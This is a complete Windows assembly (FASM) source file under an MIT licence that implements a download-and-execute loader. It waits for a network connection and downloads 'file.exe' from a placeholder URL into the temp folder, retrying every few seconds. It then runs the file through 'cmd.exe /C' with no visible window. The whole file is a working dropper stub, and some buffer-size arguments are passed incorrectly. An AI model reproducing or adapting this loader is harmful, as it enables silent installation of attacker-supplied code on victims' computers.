;MIT License

;Copyright (c) 2022 kadzicu

;Permission is hereby granted, free of charge, to any person obtaining a copy
;of this software and associated documentation files (the "Software"), to deal
;in the Software without restriction, including without limitation the rights
;to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
;copies of the Software, and to permit persons to whom the Software is
;furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included in all
;copies or substantial portions of the Software.

;THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
;IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
;FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
;AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
;LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
;OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
;SOFTWARE.

format PE GUI 4.0
entry start
include 'win32a.inc'

section '.data' data readable writable

        tmpDir rb 256
        fileDir rb 256
        param rb 256

        sleepSeconds dd 5

        url db 'http://file.exe',0
        fileName db 'file.exe',0

        s1 db '/C ',0
        s2 db 'open',0
        s3 db 'cmd.exe',0

section '.code' code readable executable

        start:
                push tmpDir        ; [out] LPSTR lpBuffer
                push tmpDir        ; [in]  DWORD nBufferLength
                call [GetTempPath] ; stdcall (calling conventions)
;----------------------------------------------------------------------------------------------
                push tmpDir     ; const char *src
                push fileDir    ; rsize_t dest_size
                push fileDir    ; char *dest
                call [strcpy_s] ; cdecl (calling conventions)

                mov eax,4       ; size (4 bytes == 32 bits)
                mov ebx,3       ; number of arguments
                mul ebx         ; 4 * 3
                add esp,eax     ; clear stack
;----------------------------------------------------------------------------------------------
                push fileName   ; const char *strSource
                push fileDir    ; size_t numberOfElements
                push fileDir    ; char *strDestination
                call [strcat_s] ; cdecl (calling conventions)

                mov eax,4       ; size (4 bytes == 32 bits)
                mov ebx,3       ; number of arguments
                mul ebx         ; 4 * 3
                add esp,eax     ; clear stack
;----------------------------------------------------------------------------------------------
                push s1         ; const char *src
                push param      ; rsize_t dest_size
                push param      ; char *dest
                call [strcpy_s] ; cdecl (calling conventions)

                mov eax,4       ; size (4 bytes == 32 bits)
                mov ebx,3       ; number of arguments
                mul ebx         ; 4 * 3
                add esp,eax     ; clear stack
;----------------------------------------------------------------------------------------------
                push fileDir    ; const char *strSource
                push param      ; size_t numberOfElements
                push param      ; char *strDestination
                call [strcat_s] ; cdecl (calling conventions)

                mov eax,4       ; size (4 bytes == 32 bits)
                mov ebx,3       ; number of arguments
                mul ebx         ; 4 * 3
                add esp,eax     ; clear stack
;----------------------------------------------------------------------------------------------
restart:
                push fileDir          ; [in] LPCSTR pszPath
                call [PathFileExists] ; stdcall (calling conventions)
                cmp eax,0
                jz download           ; false
                jne execute           ; true
download:
                push 0                           ; [in]  DWORD   dwReserved
                push 0                           ; [out] LPDWORD lpdwFlags
                call [InternetGetConnectedState] ; stdcall (calling conventions)
                cmp eax,0
                jz sleep                         ; false

                push 0                   ;            LPBINDSTATUSCALLBACK lpfnCB
                push 0                   ; _Reserved_ DWORD                dwReserved
                push fileDir             ;            LPCTSTR              szFileName
                push url                 ;            LPCTSTR              szURL
                push 0                   ;            LPUNKNOWN            pCaller
                call [URLDownloadToFile] ; stdcall (calling conventions)
                cmp eax,0
                jne sleep                ; false
                jz execute               ; true
execute:
                push 0              ; [in]           INT    nShowCmd
                push 0              ; [in, optional] LPCSTR lpDirectory
                push param          ; [in, optional] LPCSTR lpParameters
                push s3             ; [in]           LPCSTR lpFile
                push s2             ; [in, optional] LPCSTR lpOperation
                push 0              ; [in, optional] HWND   hwnd
                call [ShellExecute] ; stdcall (calling conventions)
                jmp exit
sleep:
                mov eax,[sleepSeconds]
                mov ebx,1000
                mul ebx      ; sleepSeconds * 1000

                push eax     ; [in] DWORD dwMilliseconds
                call [Sleep] ; stdcall (calling conventions)
                jmp restart
exit:
                push 0             ; [in] UINT uExitCode
                call [ExitProcess] ; stdcall (calling conventions)

section '.idata' import data readable

        library kernel32, 'kernel32.dll',\
                wininet, 'wininet.dll',\
                urlmon, 'urlmon.dll',\
                shlwapi, 'shlwapi.dll',\
                msvcrt, 'msvcrt.dll',\
                shell32, 'shell32.dll'

        import kernel32,\
               ExitProcess, 'ExitProcess',\
               GetTempPath, 'GetTempPathA',\
               Sleep, 'Sleep'

        import wininet,\
               InternetGetConnectedState, 'InternetGetConnectedState'

        import urlmon,\
               URLDownloadToFile, 'URLDownloadToFileA'

        import shlwapi,\
               PathFileExists, 'PathFileExistsA'

        import msvcrt,\
               strcpy_s, 'strcpy_s',\
               strcat_s, 'strcat_s'

        import shell32,\
               ShellExecute, 'ShellExecuteA'
